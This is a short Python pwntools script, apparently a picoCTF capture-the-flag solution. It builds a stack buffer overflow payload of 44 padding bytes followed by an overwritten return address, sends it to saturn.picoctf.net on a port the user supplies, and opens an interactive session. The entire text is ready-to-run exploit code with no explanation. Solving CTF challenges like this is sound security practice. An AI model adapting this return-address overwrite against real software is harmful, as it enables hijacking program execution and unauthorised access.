from pwn import *
payload = b'a' * (0x28+4) + b'\xf6\x91\x04\x08'
port = int(input('port='))
r = remote('saturn.picoctf.net', port)
r.sendline(payload)
r.interactive()
